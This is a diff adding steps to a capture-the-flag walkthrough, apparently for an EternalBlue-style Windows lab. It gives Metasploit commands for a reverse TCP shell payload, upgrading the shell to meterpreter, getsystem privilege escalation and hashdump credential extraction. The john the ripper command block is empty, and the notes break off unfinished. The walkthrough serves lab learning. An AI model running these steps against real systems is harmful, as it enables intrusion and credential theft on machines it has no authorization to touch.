@@ -55,14 +55,87 @@ answer: RHOSTS
 ![image](https://github.com/user-attachments/assets/df7a2aa9-9820-4da4-be9d-1d43e354763c)
 ![image](https://github.com/user-attachments/assets/f9066c2a-c8f5-4035-8f1c-9a4c867bf0bb)
 
+```
+set payload windows/x64/shell/reverse_tcp
+```
+run the exploit
+
+```
+run
+```
+
 ## Post-exploit: Gain Access
 ![image](https://github.com/user-attachments/assets/c717fb13-762f-4b65-96a1-f126e200c3fc)
 we are now SYSTEM!
 
-set the system shell to background
+set the system shell to background (ctrl+z)
+```
+search shell_to_meterpreter
+```
+
+```
+use 0
+```
 
 ![image](https://github.com/user-attachments/assets/d60d8397-52c8-4eb3-8ed6-f35d159dbf65)
 use the shell_to_meterpreter as seen above
+
+list the sessions
+```
+sessions -l
+```
+![image](https://github.com/user-attachments/assets/331948b1-3689-405c-b6c2-8c072a327817)
+
+```
+set session 1
+```
+
+```
+run
+```
+wait forever for the run to complete, it should take time to process once it reads 'stopping exploit/multi/handler'
+
+![image](https://github.com/user-attachments/assets/063fea0b-8481-4736-a775-84734993deac)
+
+list the sessions again, and select the meterpreter
+
+```
+sessions -i 3
+```
+
+
+```
+getsystem
+```
+confirm that you are running as system
+
+Run hashdump cmd to get the non-default user
+```
+hashdump
+```
+
+![image](https://github.com/user-attachments/assets/c385faec-8c9b-4415-8081-94b8a0570c70)
+
+answer: jon
+
+Running john the ripper, crack the hashed password
+
+```
+
+```
+![image](https://github.com/user-attachments/assets/47e25664-d720-458b-b3ad-711bb1a338fa)
+
+Flag 1 at system root:
+
+![image](https://github.com/user-attachments/assets/1d4e82db-d442-4998-815e-7311fa47b6d0)
+
+
+![image](https://github.com/user-attachments/assets/5ffb90d4-957f-40a5-95f8-483c28affffa)
+
+![image](https://github.com/user-attachments/assets/716c6eb3-124d-463b-bbc6-64967bfcd7e5)
+
+![image](https://github.com/user-attachments/assets/520d8364-f9ab-4ee1-9744-b9e849e87986)
+
 
 
 ...brb
